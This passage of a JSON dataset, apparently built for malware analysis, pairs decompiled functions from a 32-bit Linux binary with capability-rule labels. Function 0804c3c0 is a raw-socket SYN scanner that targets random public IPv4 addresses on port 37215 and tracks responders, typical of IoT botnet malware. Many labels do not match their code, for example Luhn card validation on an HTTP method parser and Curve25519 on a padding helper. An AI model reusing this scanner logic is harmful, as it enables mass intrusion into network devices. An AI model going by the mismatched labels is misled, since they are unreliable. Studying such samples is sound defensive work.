}\n    if (iStack4288 == 5) goto code_r0x0804e0a4;\n    iStack4288 = iStack4288 + 1;\n    if (puVar8 != 0xffffffff) {\n        uStack4320 = 0x804df59;\n        puStack4316 = puVar8;\n        fcn.0804eaab();\n    }\n    goto code_r0x0804df5c;\n}\n",
        "token_count": 3080
    },
    "08051ae7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.08051ae7(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uStack12;\n    \n    iVar1 = 0;\n    while (iVar1 = iVar1 + -1,  iVar1 != -1) {\n        (**(segment.LOAD1 + iVar1 * 4))();\n    }\n    if (*0x8058878 != NULL) {\n        (**0x8058878)();\n    }\n    if (*0x805887c != NULL) {\n    // WARNING: Could not recover jumptable at 0x08051b20. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x805887c)();\n        return uVar2;\n    }\n    return uStack12;\n}\n",
        "token_count": 171
    },
    "0804feab": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * fcn.0804feab(uint *param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    puVar3 = param_1;\n    for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    puVar2 = param_2;\n    puVar4 = puVar3;\n    if ((param_3 & 2) != 0) {\n        puVar4 = puVar3 + 2;\n        puVar2 = param_2 + 2;\n        *puVar3 = *param_2;\n    }\n    if ((param_3 & 1) != 0) {\n        *puVar4 = *puVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 244
    },
    "08052624": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __regparm3\nfcn.08052624(uint param_1, int32_t param_2, uint param_3, char *param_4, uint32_t param_5, uint16_t *param_6)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint extraout_EDX;\n    uint32_t uVar6;\n    ulong uVar7;\n    \n    uVar4 = param_5;\n    if ((*(param_6 + 1) & 2) == 0) {\n        param_2 = *(param_6 + 8);\n        if (*(param_6 + 2) == -2) {\n            uVar2 = *(param_6 + 6) - param_2;\n            if (uVar2 < param_5) {\n                uVar4 = uVar2;\n            }\n            fcn.0804feab(param_2, param_4, uVar4, uVar2);\n            *(param_6 + 8) = *(param_6 + 8) + uVar4;\n            return param_5;\n        }\n        if (param_5 <= *(param_6 + 6) - param_2) {\n            fcn.0804feab(param_2, param_4, param_5, param_3);\n            *(param_6 + 8) = *(param_6 + 8) + param_5;\n            if ((*(param_6 + 1) & 1) == 0) {\n                return param_5;\n            }\n            iVar3 = fcn.08052f1e(param_4, 10, param_5, extraout_EDX);\n            if (iVar3 == 0) {\n                return param_5;\n            }\n            uVar4 = fcn.0804f1e2(param_6);\n            if (uVar4 == 0) {\n                return param_5;\n            }\n            uVar2 = param_5;\n            if (uVar4 < param_5) {\n                uVar2 = uVar4;\n            }\n            param_4 = param_4 + (param_5 - uVar2);\n            iVar3 = fcn.08052eda(param_4, 10, uVar2, param_5 - uVar2);\n            if (iVar3 == 0) {\n                return param_5;\n            }\n            *(param_6 + 8) = *(param_6 + 8) - (param_4 + (uVar2 - iVar3));\n            return param_5 - (param_4 + (uVar2 - iVar3));\n        }\n        if (param_2 != *(param_6 + 4)) {\n            uVar7 = fcn.0804f1e2(param_6);\n            param_2 = uVar7 >> 0x20;\n            if (uVar7 != 0) {\n                return 0;\n            }\n        }\n    }\n    while( true ) {\n        if (uVar4 == 0) {\n            return param_5;\n        }\n        uVar2 = uVar4;\n        if (uVar4 < 0) {\n            uVar2 = 0x7fffffff;\n        }\n        uVar7 = fcn.0804ed18(*(param_6 + 2), param_4, uVar2, param_2);\n        param_2 = uVar7 >> 0x20;\n        iVar3 = uVar7;\n        if (iVar3 < 0) break;\n        param_4 = param_4 + iVar3;\n        uVar4 = uVar4 - iVar3;\n    }\n    pcVar5 = *(param_6 + 4);\n    *param_6 = *param_6 | 8;\n    uVar2 = *(param_6 + 6) - pcVar5;\n    if (uVar2 != 0) {\n        uVar6 = uVar4;\n        if (uVar2 <= uVar4) {\n            uVar6 = uVar2;\n        }\n        while ((cVar1 = *param_4,  *pcVar5 = cVar1,  cVar1 != '\\n' || ((*(param_6 + 1) & 1) == 0))) {\n            pcVar5 = pcVar5 + 1;\n            uVar6 = uVar6 - 1;\n            if (uVar6 == 0) break;\n            param_4 = param_4 + 1;\n        }\n        *(param_6 + 8) = pcVar5;\n        uVar4 = uVar4 - (pcVar5 - *(param_6 + 4));\n    }\n    return param_5 - uVar4;\n}\n",
        "token_count": 1048
    },
    "0804db30": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nvoid fcn.0804db30(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x805684c << 0xb ^ *0x805684c;\n    *0x805684c = *0x8056850;\n    *0x8056850 = *0x8056854;\n    *0x8056854 = *0x8056858;\n    *0x8056858 = uVar1 >> 8 ^ uVar1 ^ *0x8056858 ^ *0x8056858 >> 0x13;\n    return;\n}\n",
        "token_count": 131
    },
    "08053423": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t * fcn.08053423(uint32_t *param_1, char param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        if ((param_1 & 3) == 0) {\n            do {\n                do {\n                    puVar2 = param_1;\n                    uVar3 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2)) ^ *puVar2;\n                    param_1 = puVar2 + 1;\n                } while (((uVar3 + 0x7efefeff ^ ~uVar3) & 0x81010100) == 0);\n                puVar1 = puVar2;\n            } while ((((*puVar2 != param_2) && (puVar1 = puVar2 + 1,  *(puVar2 + 1) != param_2)) &&\n                     (puVar1 = puVar2 + 2,  *(puVar2 + 2) != param_2)) &&\n                    (puVar1 = puVar2 + 3,  *(puVar2 + 3) != param_2));\n            return puVar1;\n        }\n        if (*param_1 == param_2) break;\n        param_1 = param_1 + 1;\n    }\n    return param_1;\n}\n",
        "token_count": 314
    },
    "0804f243": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nint32_t fcn.0804f243(uint param_1, char param_2, int32_t param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar1 = param_3;\n    if (param_2 < '\\0') {\n        iVar1 = fcn.0804ff0e(param_4);\n        in_ECX = extraout_ECX;\n        if ((0 < param_3 - iVar1) && (iVar3 = fcn.0804f20d(),  in_ECX = extraout_ECX_00,  iVar3 != param_3 - iVar1)) {\n            return iVar3;\n        }\n    }\n    iVar2 = 0;\n    if (0 < iVar1) {\n        iVar2 = fcn.08052624(param_4, iVar1, param_1, in_ECX);\n    }\n    return iVar3 + iVar2;\n}\n",
        "token_count": 241
    },
    "0804f855": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nulong fcn.0804f855(char **param_1, char *param_2)\n\n{\n    char **ppcVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack12;\n    \n    fcn.0804fef9(param_1, 0, 0xbc);\n    param_1[6] = param_1[6] + -1;\n    *param_1 = param_2;\n    ppcVar1 = param_1 + 10;\n    iVar4 = 9;\n    do {\n        *ppcVar1 = 0x8;\n        ppcVar1 = ppcVar1 + 1;\n        iVar4 = iVar4 + -1;\n        pcVar2 = param_2;\n    } while (iVar4 != 0);\ncode_r0x0804f8b6:\n    do {\n        if (*pcVar2 == '\\0') {\n            *param_1 = param_2;\n            uVar3 = 0;\ncode_r0x0804f8c0:\n            return CONCAT44(uStack12, uVar3);\n        }\n        if ((*pcVar2 != '%') || (pcVar2 = pcVar2 + 1,  *pcVar2 == '%')) {\n            pcVar2 = pcVar2 + 1;\n            goto code_r0x0804f8b6;\n        }\n        *param_1 = pcVar2;\n        iVar4 = fcn.0804fa3e(param_1);\n        if (iVar4 < 0) {\n            uVar3 = 0xffffffff;\n            goto code_r0x0804f8c0;\n        }\n        pcVar2 = *param_1;\n    } while( true );\n}\n",
        "token_count": 385
    },
    "08052520": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.08052520(uint32_t **param_1, uint32_t **param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t *apuStack32 [4];\n    \n    if (param_1 == NULL) {\n        iVar5 = 0;\n        param_1 = apuStack32;\n        param_4 = 0xffffffff;\n    }\n    else {\n        iVar5 = 1;\n        if (param_1 == param_2) {\n            iVar5 = 0;\n            param_1 = apuStack32;\n        }\n    }\n    if (param_4 < param_3) {\n        param_3 = param_4;\n    }\n    puVar4 = *param_2;\n    uVar3 = param_3;\n    do {\n        if (uVar3 == 0) {\ncode_r0x0805258f:\n            if (param_1 != apuStack32) {\n                *param_2 = puVar4;\n            }\n            return param_3 - uVar3;\n        }\n        if (0x7f < *puVar4) {\n            puVar2 = fcn.0804efb0();\n            *puVar2 = 0x54;\n            return -1;\n        }\n        cVar1 = *puVar4;\n        *param_1 = cVar1;\n        if (cVar1 == '\\0') {\n            puVar4 = NULL;\n            goto code_r0x0805258f;\n        }\n        puVar4 = puVar4 + 1;\n        param_1 = param_1 + iVar5;\n        uVar3 = uVar3 - 1;\n    } while( true );\n}\n",
        "token_count": 414
    },
    "080531a9": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nbool fcn.080531a9(int32_t param_1, int32_t param_2)\n\n{\n    return (*(param_1 + (param_2 - 1U >> 5) * 4) & 1 << (param_2 - 1U & 0x1f)) != 0;\n}\n",
        "token_count": 71
    },
    "080531cd": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint fcn.080531cd(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    \n    puVar1 = param_1 + (param_2 - 1U >> 5) * 4;\n    *puVar1 = *puVar1 | 1 << (param_2 - 1U & 0x1f);\n    return 0;\n}\n",
        "token_count": 93
    },
    "08048094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.08048094(void)\n\n{\n    // [01] -r-x section size 28 named .init\n    fcn.080480b0();\n    fcn.08048110();\n    fcn.080534c0();\n    return;\n}\n",
        "token_count": 57
    },
    "08048110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0804812b)\n// WARNING: Removing unreachable block (ram,0x08048152)\n\nvoid fcn.08048110(void)\n\n{\n    return;\n}\n",
        "token_count": 46
    },
    "0804be90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0804be90(uint param_1)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint uVar2;\n    int32_t unaff_EBX;\n    ulong uVar3;\n    \n    iVar1 = fcn.0804ff3a(param_1, \"GET /\");\n    if (iVar1 != 0) {\n        unaff_EBX = iVar1 + 5;\n    }\n    uVar3 = fcn.0804ff3a(param_1, \"HEAD /\", extraout_ECX, extraout_ECX);\n    uVar2 = uVar3 >> 0x20;\n    if (uVar3 != 0) {\n        unaff_EBX = uVar3 + 6;\n    }\n    iVar1 = fcn.0804ff3a(param_1, \"POST /\", uVar2, uVar2);\n    if (iVar1 != 0) {\n        unaff_EBX = iVar1 + 6;\n    }\n    fcn.080500d4(unaff_EBX, 0x80541c2, iVar1, iVar1);\n    return;\n}\n",
        "token_count": 249
    },
    "0804c3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0804c3c0(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint8_t uVar12;\n    uint32_t *puVar13;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar14;\n    uint *puVar15;\n    int32_t *piVar16;\n    uint32_t *puVar17;\n    uint32_t *puVar18;\n    uint *puVar19;\n    uint32_t uStack2396;\n    int32_t *piStack2392;\n    uint32_t uStack2388;\n    uint32_t *puStack2384;\n    uchar *puStack2380;\n    uchar *puStack2376;\n    uint16_t uStack2366;\n    uchar auStack316 [128];\n    uchar auStack188 [168];\n    uint32_t *puStack20;\n    \n    puStack20 = NULL;\n    puStack2384 = 0x804c3dc;\n    *0x80567e0 = fcn.0804ead9();\n    if ((0 < *0x80567e0) || (*0x80567e0 == -1)) {\n        return;\n    }\n    puStack2384 = 0x804c3f8;\n    *0x80588a0 = fcn.0804e610();\n    puStack2384 = 0x804c402;\n    fcn.0804db80();\n    uStack2396 = 0;\n    *0x8056828 = fcn.0804ecea();\n    piVar16 = piStack2392;\n    uVar8 = uStack2396;\n    piStack2392 = 0x520;\n    uStack2396 = 0x80;\n    puVar5 = fcn.08050b95();\n    puVar13 = puVar5;\n    puVar17 = NULL;\n    *0x805682c = puVar5;\n    do {\n        *puVar13 = 0xffffffff;\n        puVar13 = puVar13 + 0x148;\n        puVar18 = puVar17 + 1;\n        puVar5[puVar17 * 0x148 + 2] = 0;\n        puVar17 = puVar18;\n    } while (puVar18 < 0x80);\n    uStack2388 = 6;\n    piStack2392 = 0x3;\n    uStack2396 = 2;\n    puStack2384 = puVar18;\n    puStack20 = puVar18;\n    *0x80567e4 = fcn.080503d0();\n    if (*0x80567e4 == -1) {\n        puVar15 = &stack0xfffff6a4;\n        uStack2396 = 0;\n        fcn.08051749();\n        goto code_r0x0804c818;\n    }\n    uStack2388 = 0;\n    piStack2392 = 0x3;\n    uStack2396 = *0x80567e4;\n    puStack2384 = puVar5;\n    uStack2388 = fcn.0804e9ed();\n    uStack2388 = uStack2388 | 0x800;\n    piStack2392 = 0x4;\n    puVar15 = &stack0xfffff6a4;\n    uStack2396 = *0x80567e4;\n    fcn.0804e9ed();\n    puStack20 = 0x1;\n    uStack2396 = 4;\n    iVar6 = fcn.08050395(*0x80567e4, 0, 3, &stack0xffffffec);\n    if (iVar6 != 0) {\n        uStack2396 = *0x80567e4;\n        fcn.0804eaab();\n        uStack2396 = 0;\n        fcn.08051749();\n        uVar9 = extraout_ECX_00;\n        goto code_r0x0804ccf6;\n    }\n    do {\n        puStack2384 = 0x804c4e0;\n        uVar3 = fcn.0804db30();\n        uStack2366 = uVar3;\n    } while ((uVar3 >> 8 | uVar3 << 8) < 0x400);\n    *0x8056800 = 0x45;\n    *0x8056802 = 0x2800;\n    puStack2384 = 0x804c506;\n    *0x8056804 = fcn.0804db30();\n    *0x8056808 = 0x40;\n    *0x8056809 = 6;\n    *0x8056820 = *0x8056820 & 0xf | 0x50;\n    *0x8056816 = 0x5f91;\n    puStack2384 = 0x804c53f;\n    *0x8056814 = uVar3;\n    *0x8056822 = fcn.0804db30();\n    *0x8056821 = *0x8056821 | 2;\n    puStack2376 = &stack0xffffff44;\n    puStack2380 = &stack0xfffffec4;\n    puVar15 = &stack0xfffff6b4;\n    do {\n        *(puVar15 + 8) = *0x8056828;\n        if (*(puVar15 + 0x10) != *0x8056828) {\n            *(puVar15 + 0x938) = 0;\n            do {\n                *(puVar15 + 0x910) = 0;\n                *(puVar15 + 0x914) = 0;\n                *(puVar15 + 0x918) = 0;\n                *(puVar15 + 0x91c) = 0;\n                *(puVar15 + -4) = 0x804c766;\n                *0x8056804 = fcn.0804db30();\n                *0x805680c = *0x80588a0;\ncode_r0x0804c776:\n                do {\n                    do {\n                        *(puVar15 + -4) = 0x804c77b;\n                        uVar8 = fcn.0804db30();\n                        *(puVar15 + -0x10) = 0;\n                        *(puVar15 + -0x14) = 0x804c787;\n                        uVar9 = fcn.0804ecea();\n                        *(puVar15 + -0x10) = uVar9;\n                        *(puVar15 + -0x14) = 0x804c793;\n                        fcn.080514e0();\n                        puVar18 = uVar8 >> 8;\n                        piVar16 = uVar8 >> 0x10;\n                        puVar5 = uVar8 >> 0x18;\n                        cVar2 = uVar8;\n                    } while (cVar2 == '\\x7f');\n                } while ((((cVar2 == '\\0') || (cVar2 == '\\x03')) || (cVar2 - 0xfU < 2)) ||\n                        ((cVar2 == '8' || (cVar2 == '\\n'))));\n                uVar12 = uVar8 >> 8;\n                if (cVar2 == -0x40) {\n                    if (uVar12 == 0xa8) goto code_r0x0804c776;\njoined_r0x0804c831:\n                    uVar12 = puVar18;\n                    if (cVar2 == -0x57) {\n                        if (uVar12 == 0xff) goto code_r0x0804c776;\n                    }\n                    else if (uVar8 == -0x3a) {\n                        if ((uVar12 < 0x12) || (0x13 < uVar12)) goto code_r0x0804c5ba;\n                        goto code_r0x0804c776;\n                    }\ncode_r0x0804c5af:\n                    if (0xdf < uVar8) goto code_r0x0804c776;\n                }\n                else {\n                    if (cVar2 != -0x54) {\n                        if (cVar2 != 'd') goto joined_r0x0804c831;\n                        if (uVar12 < 0x40) goto code_r0x0804c5ba;\n                        if (0x7e < uVar12) goto code_r0x0804c5af;\n                        goto code_r0x0804c776;\n                    }\ncode_r0x0804c818:\n                    if (0xf < puVar18) {\n                        if (0x1f < puVar18) {\n                            cVar2 = uVar8;\n                            goto joined_r0x0804c831;\n                        }\n                        goto code_r0x0804c776;\n                    }\n                }\ncode_r0x0804c5ba:\n                cVar2 = uVar8;\n                if ((((((cVar2 - 6U < 2) || (cVar2 == '\\v')) || (cVar2 == '\\x15')) ||\n                     ((cVar2 == '\\x16' || (cVar2 == '\\x1a')))) || (cVar2 == '\\x1c')) ||\n                   (((cVar2 == '\\x1d' || (cVar2 == '\\x1e')) ||\n                    ((cVar2 == '!' || (((cVar2 == '7' || (cVar2 == -0x2a)) || (cVar2 == -0x29))))))))\n                goto code_r0x0804c776;\n                *(puVar15 + -4) = 0x804c624;\n                fcn.08051493();\n                *(puVar15 + -4) = 0x804c629;\n                uVar7 = fcn.0804db30();\n                uVar7 = uVar7 & 3;\n                if (uVar7 == 1) {\n                    uVar8 = (piVar16 & 0xff) << 8 | 0xc5000000;\n                    uVar7 = (puVar18 & 0xff) << 0x10 | puVar5 & 0xff | uVar8;\n                    uVar3 = uVar7;\n                    uVar4 = uVar7 >> 0x10;\n                    *0x8056810 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n                }\n                else if (uVar7 == 0) {\n                    uVar8 = (piVar16 & 0xff) << 8 | 0x9d000000;\n                    uVar7 = (puVar18 & 0xff) << 0x10 | puVar5 & 0xff | uVar8;\n                    uVar3 = uVar7;\n                    uVar4 = uVar7 >> 0x10;\n                    *0x8056810 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n                }\n                else if (uVar7 == 2) {\n                    uVar8 = (piVar16 & 0xff) << 8 | 0x29000000;\n                    uVar7 = (puVar18 & 0xff) << 0x10 | puVar5 & 0xff | uVar8;\n                    uVar3 = uVar7;\n                    uVar4 = uVar7 >> 0x10;\n                    *0x8056810 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n                }\n                else {\n                    uVar7 = uVar8 << 0x18 | (puVar18 & 0xff) << 0x10;\n                    uVar8 = uVar7 | puVar5 & 0xff;\n                    uVar3 = uVar7 >> 0x10;\n                    *0x8056810 = CONCAT22(((piVar16 & 0xff) << 8) >> 8 | (puVar5 & 0xff) << 8, uVar3 >> 8 | uVar3 << 8);\n                }\n                *0x805680a = 0;\n                *(puVar15 + -4) = uVar8;\n                *(puVar15 + -8) = uVar8;\n                *(puVar15 + -0xc) = 0x14;\n                *(puVar15 + -0x10) = 0x8056800;\n                *(puVar15 + -0x14) = 0x804c691;\n                *0x805680a = fcn.0804bd80();\n                *(puVar15 + -0x14) = 0x14;\n                *(puVar15 + -0x18) = 0x1400;\n                *0x8056816 = 0x5f91;\n                *(puVar15 + -0x1c) = 0x8056814;\n                *0x8056818 = *0x8056810;\n                *(puVar15 + -0x20) = 0x8056800;\n                *0x8056824 = 0;\n                *(puVar15 + -0x24) = 0x804c6c9;\n                *0x8056824 = fcn.0804bdd0();\n                *(puVar15 + 0x910) = 2;\n                *(puVar15 + 0x914) = *0x8056810;\n                *(puVar15 + 0x912) = *0x8056816;\n                *(puVar15 + -0xc) = 0x10;\n                *(puVar15 + -0x10) = puVar15 + 0x910;\n                *(puVar15 + -0x14) = 0x4000;\n                *(puVar15 + -0x18) = 0x28;\n                *(puVar15 + -0x1c) = 0x8056800;\n                *(puVar15 + -0x20) = *0x80567e4;\n                *(puVar15 + -0x24) = 0x804c717;\n                fcn.08050352();\n                iVar6 = *(puVar15 + 0x938);\n                *(puVar15 + 0x938) = iVar6 + 1;\n            } while (iVar6 + 1 < 0x100);\n            *(puVar15 + 0x10) = *(puVar15 + 8);\n        }\n        puVar15[-1] = 0x804c853;\n        piVar16 = fcn.0804efb0();\n        iVar6 = 0;\n        piVar10 = piVar16;\n        while( true ) {\n            do {\n                do {\n                    do {\n                        *piVar16 = 0;\n                        puVar15[-1] = piVar10;\n                        puVar15[-2] = piVar10;\n                        puVar15[-3] = 0;\n                        puVar15[-4] = 0;\n                        puVar15[-5] = 0x4000;\n                        puVar15[-6] = 0x5ea;\n                        puVar15[-7] = puVar15 + 0x26;\n                        puVar15[-8] = *0x80567e4;\n                        puVar15[-9] = 0x804c87e;\n                        piVar10 = fcn.080502dc();\n                        if ((piVar10 < 1) || (*piVar16 == 0xb)) goto code_r0x0804c950;\n                    } while (((piVar10 < 0x28) ||\n                             ((piVar10 = *(puVar15 + 0x36),  piVar10 != *0x80588a0 || (*(puVar15 + 0x2f) != '\\x06'))))\n                            || ((*(puVar15 + 0x3a) != 0x5f91 || (*(puVar15 + 0xe) != *(puVar15 + 0xf)))));\n                    uVar12 = *(puVar15 + 0x47);\n                    piVar10 = piVar10 & 0xffffff00 | uVar12;\n                } while (((((uVar12 & 2) == 0) || ((uVar12 & 0x10) == 0)) || ((uVar12 & 4) != 0)) || ((uVar12 & 1) != 0)\n                        );\n                uVar3 = *(puVar15 + 0x42);\n                uVar4 = *(puVar15 + 0x42) >> 0x10;\n                iVar11 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8) + -1;\n                uVar3 = iVar11;\n                uVar4 = iVar11 >> 0x10;\n                piVar10 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n            } while (*(puVar15 + 0x32) != piVar10);\n            if (0x7f < iVar6) break;\n            uVar8 = (*0x805682c + iVar6 * 0x148)[2];\n            puVar5 = *0x805682c + iVar6 * 0x148;\n            while (uVar8 != 0) {\n                iVar6 = iVar6 + 1;\n                if (iVar6 == 0x80) goto code_r0x0804c950;\n                uVar8 = puVar5[0x14a];\n                puVar5 = puVar5 + 0x148;\n            }\n            uVar9 = *(puVar15 + 0x3a);\n            puVar5[3] = *(puVar15 + 0x32);\n            *(puVar5 + 4) = uVar9;\n            puVar15[-1] = 0x804c947;\n            piVar10 = fcn.0804c2f0();\n        }\ncode_r0x0804c950:\n        puVar19 = puVar15[1];\n        for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar19 = 0;\n            puVar19 = puVar19 + 1;\n        }\n        puVar19 = *puVar15;\n        for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar19 = 0;\n            puVar19 = puVar19 + 1;\n        }\n        uVar8 = 0;\n        puVar15[0x24e] = 0;\n        puVar15[5] = 0;\n        iVar6 = 0;\n        do {\n            puVar5 = *0x805682c + iVar6 * 0x148;\n            uVar7 = puVar5[2];\n            if (uVar7 != 0) {\n                if (*0x8056828 - puVar5[1] < 6) {\n                    if (((uVar7 == 1) || (uVar7 == 3)) || (uVar7 == 4)) {\n                        uVar7 = *puVar5;\n                        puVar1 = puVar15 + ((uVar7 & 0x1f) >> 3) + (uVar7 >> 5) * 4 + 0x810;\n                        *puVar1 = *puVar1 | '\\x01' << (uVar7 & 7);\n                        if (uVar8 < *puVar5) {\n                            uVar8 = *puVar5;\n                        }\n                    }\n                    else {\n                        uVar7 = *puVar5;\n                        puVar1 = puVar15 + ((uVar7 & 0x1f) >> 3) + (uVar7 >> 5) * 4 + 0x890;\n                        *puVar1 = *puVar1 | '\\x01' << (uVar7 & 7);\n                        if (puVar15[5] < *puVar5) {\n                            puVar15[5] = *puVar5;\n                        }\n                    }\n                }\n                else {\n                    puVar15[-4] = *puVar5;\n                    puVar15[-5] = 0x804cc8a;\n                    fcn.0804eaab();\n                    *puVar5 = 0xffffffff;\n                    puVar5[2] = 0;\n                    puVar15[-3] = 0x100;\n                    puVar15[-4] = puVar5 + 6;\n                    puVar15[-5] = 0x804cca7;\n                    fcn.0804e5b0();\n                }\n            }\n            iVar6 = puVar15[0x24e] + 1;\n            puVar15[0x24e] = iVar6;\n        } while (iVar6 < 0x80);\n        puVar15[0x249] = 0;\n        puVar15[0x248] = 1;\n        puVar15[-4] = puVar15 + 0x248;\n        puVar15[-5] = 0;\n        puVar15[-6] = puVar15 + 0x204;\n        puVar15[-7] = puVar15 + 0x224;\n        uVar7 = puVar15[5];\n        if (puVar15[5] < uVar8) {\n            uVar7 = uVar8;\n        }\n        puVar15[-8] = uVar7 + 1;\n        puVar15[-9] = 0x804ca3a;\n        fcn.0804ec3d();\n        puVar15[-4] = 0;\n        puVar15[-5] = 0x804ca44;\n        *0x8056828 = fcn.0804ecea();\n        puVar15[0x24e] = 0;\n        iVar6 = 0;\n        do {\n            puVar18 = *0x805682c + iVar6 * 0x148;\n            uVar8 = *puVar18;\n            if (uVar8 != 0xffffffff) {\n                if ((*(puVar15 + ((uVar8 & 0x1f) >> 3) + (uVar8 >> 5) * 4 + 0x810) >> (uVar8 & 7) & 1) == 0) {\ncode_r0x0804ca8e:\n                    if ((*(puVar15 + ((uVar8 & 0x1f) >> 3) + (uVar8 >> 5) * 4 + 0x890) >> (uVar8 & 7) & 1) != 0) {\n                        while (puVar18[2] != 0) {\n                            puVar5 = puVar18 + 6;\n                            if (puVar18[5] == 0x100) {\n                                *(puVar15 + -4) = puVar18[2];\n                                *(puVar15 + -8) = 0xc0;\n                                *(puVar15 + -0xc) = puVar18 + 0x16;\n                                *(puVar15 + -0x10) = puVar5;\n                                *(puVar15 + -0x14) = 0x804cb6c;\n                                fcn.0804fed2();\n                                puVar18[5] = puVar18[5] - 0x40;\n                            }\n                            *piVar16 = 0;\n                            uVar8 = puVar18[5];\n                            *(puVar15 + -4) = 0x4000;\n                            iVar6 = puVar5 + uVar8;\n                            *(puVar15 + -8) = 0x100 - uVar8;\n                            *(puVar15 + -0xc) = iVar6;\n                            *(puVar15 + -0x10) = *puVar18;\n                            *(puVar15 + -0x14) = 0x804cb20;\n                            iVar11 = fcn.080502a9();\n                            if (iVar11 < 1) {\n                                if (iVar11 == 0) {\n                                    *piVar16 = 0x68;\n                                }\n                                else {\n                                    if (iVar11 != -1) goto code_r0x0804cb39;\n                                    if (*piVar16 == 0xb) break;\n                                }\n                                if (puVar18[2] != 3) {\n                                    *(puVar15 + -0x10) = *puVar18;\n                                    *(puVar15 + -0x14) = 0x804ccba;\n                                    fcn.0804eaab();\n                                    *puVar18 = 0xffffffff;\n                                    puVar18[2] = 0;\n                                    *(puVar15 + -0xc) = 0x100;\n                                    *(puVar15 + -0x10) = puVar5;\n                                    *(puVar15 + -0x14) = 0x804ccd4;\n                                    fcn.0804e5b0();\n                                    break;\n                                }\n                                *(puVar15 + -0x10) = *puVar18;\n                                *(puVar15 + -0x14) = 0x804cae0;\n                                fcn.0804eaab();\n                                *(puVar15 + -0x14) = 0x804cae7;\n                                fcn.0804c2f0();\n                            }\n                            else {\n                                iVar14 = 0;\n                                do {\n                                    if (*(iVar14 + iVar6) == '\\0') {\n                                        *(iVar14 + iVar6) = 0x41;\n                                    }\n                                    iVar14 = iVar14 + 1;\n                                } while (iVar11 != iVar14);\ncode_r0x0804cb39:\n                                uVar8 = *0x8056828;\n                                puVar18[5] = puVar18[5] + iVar11;\n                                puVar18[1] = uVar8;\n                                *(puVar15 + -0x10) = puVar5;\n                                *(puVar15 + -0x14) = 0x804cb52;\n                                iVar6 = fcn.0804e4f0();\n                                *(iVar6 + 0x18 + puVar18) = 0;\n                            }\n                        }\n                    }\n                }\n                else {\n                    *(puVar15 + 0x934) = 0;\n                    *(puVar15 + 0x930) = 4;\n                    *(puVar15 + -0x10) = puVar15 + 0x930;\n                    *(puVar15 + -0x14) = puVar15 + 